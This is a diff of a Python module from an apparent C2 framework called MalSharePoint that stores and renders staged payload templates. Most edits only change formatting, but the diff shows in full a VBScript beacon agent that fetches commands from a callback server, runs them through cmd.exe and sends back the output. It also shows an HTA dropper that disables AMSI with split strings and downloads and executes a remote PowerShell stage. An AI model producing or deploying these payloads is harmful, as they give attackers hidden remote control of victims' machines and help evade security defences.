@@ -1,4 +1,12 @@
 """
+Payload Templates Subsystem — MalSharePoint
+
+This module provides a collection of pre-built staged payload templates
+inspired by Metasploit and modern C2 frameworks. It handles the storage,
+listing, and dynamic rendering of payloads for various platforms.
+"""
+
+"""
 Pre-built staged payload templates inspired by Metasploit / modern C2 frameworks.
 
 Each template provides:
@@ -158,7 +166,6 @@ while($true){{
 }}
 """,
     },
-
     # ── Batch / CMD ────────────────────────────────────────────────────
     {
         "id": "bat_reverse_tcp",
@@ -210,7 +217,6 @@ for /f "delims=" %%t in ('powershell -nop -c "$r=Invoke-RestMethod -Uri '%C2%/be
 goto beacon
 """,
     },
-
     # ── VBScript ───────────────────────────────────────────────────────
     {
         "id": "vbs_beacon_agent",
@@ -223,19 +229,19 @@ goto beacon
         "content": (
             "' --- MalSharePoint VBS Beacon Agent ---\n"
             "Dim C2Url, AgentId, SleepMs, DQ\n"
-            "C2Url = \"{CALLBACK_URL}/api/c2\"\n"
+            'C2Url = "{CALLBACK_URL}/api/c2"\n'
             "SleepMs = {SLEEP} * 1000\n"
             "DQ = Chr(34)\n"
             "\n"
             "Function HttpPost(url, body)\n"
             "    Dim http\n"
-            "    Set http = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n"
-            "    http.Open \"POST\", url, False\n"
-            "    http.setRequestHeader \"Content-Type\", \"application/json\"\n"
-            "    http.setRequestHeader \"User-Agent\", \"{UA}\"\n"
+            '    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")\n'
+            '    http.Open "POST", url, False\n'
+            '    http.setRequestHeader "Content-Type", "application/json"\n'
+            '    http.setRequestHeader "User-Agent", "{UA}"\n'
             "    On Error Resume Next\n"
             "    http.Send body\n"
-            "    If Err.Number = 0 Then HttpPost = http.responseText Else HttpPost = \"\"\n"
+            '    If Err.Number = 0 Then HttpPost = http.responseText Else HttpPost = ""\n'
             "    On Error GoTo 0\n"
             "    Set http = Nothing\n"
             "End Function\n"
@@ -243,53 +249,52 @@ goto beacon
             "Function JsonVal(json, key)\n"
             "    Dim re, m\n"
             "    Set re = New RegExp\n"
-            "    re.Pattern = DQ & key & DQ & \"\\s*:\\s*\" & DQ & \"([^\" & DQ & \"]+)\" & DQ\n"
+            '    re.Pattern = DQ & key & DQ & "\\s*:\\s*" & DQ & "([^" & DQ & "]+)" & DQ\n'
             "    Set m = re.Execute(json)\n"
-            "    If m.Count > 0 Then JsonVal = m(0).SubMatches(0) Else JsonVal = \"\"\n"
+            '    If m.Count > 0 Then JsonVal = m(0).SubMatches(0) Else JsonVal = ""\n'
             "End Function\n"
             "\n"
             "' Gather system info\n"
             "Dim sh, net, info\n"
-            "Set sh = CreateObject(\"WScript.Shell\")\n"
-            "Set net = CreateObject(\"WScript.Network\")\n"
-            "info = \"{{\" & DQ & \"hostname\" & DQ & \":\" & DQ & net.ComputerName & DQ & \",\" & DQ & \"username\" & DQ & \":\" & DQ & net.UserName & DQ & \",\" & DQ & \"os\" & DQ & \":\" & DQ & \"Windows\" & DQ & \"}}\"\n"
+            'Set sh = CreateObject("WScript.Shell")\n'
+            'Set net = CreateObject("WScript.Network")\n'
+            'info = "{{" & DQ & "hostname" & DQ & ":" & DQ & net.ComputerName & DQ & "," & DQ & "username" & DQ & ":" & DQ & net.UserName & DQ & "," & DQ & "os" & DQ & ":" & DQ & "Windows" & DQ & "}}"\n'
             "\n"
             "' Checkin\n"
             "Dim regResp\n"
-            "regResp = HttpPost(C2Url & \"/checkin\", info)\n"
-            "AgentId = JsonVal(regResp, \"agent_id\")\n"
-            "If AgentId = \"\" Then WScript.Quit\n"
+            'regResp = HttpPost(C2Url & "/checkin", info)\n'
+            'AgentId = JsonVal(regResp, "agent_id")\n'
+            'If AgentId = "" Then WScript.Quit\n'
             "\n"
             "' Beacon loop\n"
             "Do While True\n"
             "    WScript.Sleep SleepMs\n"
             "    Dim beaconResp\n"
-            "    beaconResp = HttpPost(C2Url & \"/beacon\", \"{{\" & DQ & \"agent_id\" & DQ & \":\" & DQ & AgentId & DQ & \"}}\")\n"
-            "    If InStr(beaconResp, \"task_id\") = 0 Then GoTo NextLoop\n"
+            '    beaconResp = HttpPost(C2Url & "/beacon", "{{" & DQ & "agent_id" & DQ & ":" & DQ & AgentId & DQ & "}}")\n'
+            '    If InStr(beaconResp, "task_id") = 0 Then GoTo NextLoop\n'
             "\n"
             "    Dim taskId, command\n"
-            "    taskId = JsonVal(beaconResp, \"task_id\")\n"
-            "    command = JsonVal(beaconResp, \"command\")\n"
-            "    If taskId = \"\" Or command = \"\" Then GoTo NextLoop\n"
+            '    taskId = JsonVal(beaconResp, "task_id")\n'
+            '    command = JsonVal(beaconResp, "command")\n'
+            '    If taskId = "" Or command = "" Then GoTo NextLoop\n'
             "\n"
             "    Dim exec, output\n"
             "    On Error Resume Next\n"
-            "    Set exec = sh.Exec(\"cmd.exe /c \" & command)\n"
+            '    Set exec = sh.Exec("cmd.exe /c " & command)\n'
             "    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll\n"
             "    On Error GoTo 0\n"
             "\n"
-            "    output = Replace(output, \"\\\", \"\\\\\")\n"
-            "    output = Replace(output, DQ, \"\\\" & DQ)\n"
-            "    output = Replace(output, vbCrLf, \"\\n\")\n"
-            "    output = Replace(output, vbCr, \"\\n\")\n"
-            "    output = Replace(output, vbLf, \"\\n\")\n"
+            '    output = Replace(output, "\\", "\\\\")\n'
+            '    output = Replace(output, DQ, "\\" & DQ)\n'
+            '    output = Replace(output, vbCrLf, "\\n")\n'
+            '    output = Replace(output, vbCr, "\\n")\n'
+            '    output = Replace(output, vbLf, "\\n")\n'
             "\n"
-            "    HttpPost C2Url & \"/result\", \"{{\" & DQ & \"agent_id\" & DQ & \":\" & DQ & AgentId & DQ & \",\" & DQ & \"task_id\" & DQ & \":\" & DQ & taskId & DQ & \",\" & DQ & \"output\" & DQ & \":\" & DQ & Left(output, 4000) & DQ & \",\" & DQ & \"success\" & DQ & \":true}}\"\n"
+            '    HttpPost C2Url & "/result", "{{" & DQ & "agent_id" & DQ & ":" & DQ & AgentId & DQ & "," & DQ & "task_id" & DQ & ":" & DQ & taskId & DQ & "," & DQ & "output" & DQ & ":" & DQ & Left(output, 4000) & DQ & "," & DQ & "success" & DQ & ":true}}"\n'
             "NextLoop:\n"
             "Loop\n"
         ),
     },
-
     # ── HTA (HTML Application) ────────────────────────────────────────
     {
         "id": "hta_dropper",
@@ -302,12 +307,12 @@ goto beacon
         "content": (
             "<html>\n"
             "<head><title>Loading...</title>\n"
-            "<HTA:APPLICATION ID=\"app\" WINDOWSTATE=\"minimize\" SHOWINTASKBAR=\"no\" SYSMENU=\"no\" />\n"
+            '<HTA:APPLICATION ID="app" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />\n'
             "</head>\n"
             "<body>\n"
-            "<script language=\"VBScript\">\n"
+            '<script language="VBScript">\n'
             "    Dim sh\n"
-            "    Set sh = CreateObject(\"WScript.Shell\")\n"
+            '    Set sh = CreateObject("WScript.Shell")\n'
             "    sh.Run \"powershell.exe -nop -w hidden -ep bypass -c \" & Chr(34) & \"try{{[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').SetValue($null,$true)}}catch{{}};IEX((New-Object System.Net.WebClient).DownloadString('{CALLBACK_URL}{STAGE_PATH}'))\" & Chr(34), 0, False\n"
             "    self.Close\n"
             "</script>\n"
@@ -315,7 +320,6 @@ goto beacon
             "</html>\n"
         ),
     },
-
     # ── Python ─────────────────────────────────────────────────────────
     {
         "id": "py_reverse_tcp",
@@ -467,7 +471,6 @@ while True:
         }})
 """,
     },
-
     # ── Bash / Linux ───────────────────────────────────────────────────
     {
         "id": "sh_reverse_tcp",
@@ -540,15 +543,12 @@ done
 ]
 
 # Quick access map
-TEMPLATE_MAP: dict[str, dict] = {t['id']: t for t in TEMPLATES}
+TEMPLATE_MAP: dict[str, dict] = {t["id"]: t for t in TEMPLATES}
 
 
 def list_templates() -> list[dict]:
     """Return templates metadata (without content) for listing."""
-    return [
-        {k: v for k, v in t.items() if k != 'content'}
-        for t in TEMPLATES
-    ]
+    return [{k: v for k, v in t.items() if k != "content"} for t in TEMPLATES]
 
 
 def get_template(template_id: str) -> dict | None:
@@ -566,30 +566,35 @@ def render_template(template_id: str, params: dict) -> dict | None:
     if not tpl:
         return None
 
-    lhost = str(params.get('LHOST', '127.0.0.1'))
-    lport = str(params.get('LPORT', '80'))
-    scheme = params.get('SCHEME', 'http')
+    lhost = str(params.get("LHOST", "127.0.0.1"))
+    lport = str(params.get("LPORT", "80"))
+    scheme = params.get("SCHEME", "http")
     callback_url = f"{scheme}://{lhost}:{lport}"
 
     render_params = {
-        'LHOST': lhost,
-        'LPORT': lport,
-        'CALLBACK_URL': callback_url,
-        'STAGE_URL': callback_url + tpl['default_stage_path'],
-        'STAGE_PATH': str(params.get('STAGE_PATH', tpl['default_stage_path'])),
-        'SLEEP': str(params.get('SLEEP', '5')),
-        'JITTER': str(params.get('JITTER', '10')),
-        'UA': str(params.get('UA', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36')),
+        "LHOST": lhost,
+        "LPORT": lport,
+        "CALLBACK_URL": callback_url,
+        "STAGE_URL": callback_url + tpl["default_stage_path"],
+        "STAGE_PATH": str(params.get("STAGE_PATH", tpl["default_stage_path"])),
+        "SLEEP": str(params.get("SLEEP", "5")),
+        "JITTER": str(params.get("JITTER", "10")),
+        "UA": str(
+            params.get(
+                "UA",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            )
+        ),
     }
 
-    content = tpl['content'].format(**render_params)
+    content = tpl["content"].format(**render_params)
 
     return {
-        'template_id': template_id,
-        'name': tpl['name'],
-        'payload_type': tpl['payload_type'],
-        'platform': tpl['platform'],
-        'default_stage_path': tpl['default_stage_path'],
-        'content': content,
-        'params_used': render_params,
+        "template_id": template_id,
+        "name": tpl["name"],
+        "payload_type": tpl["payload_type"],
+        "platform": tpl["platform"],
+        "default_stage_path": tpl["default_stage_path"],
+        "content": content,
+        "params_used": render_params,
     }
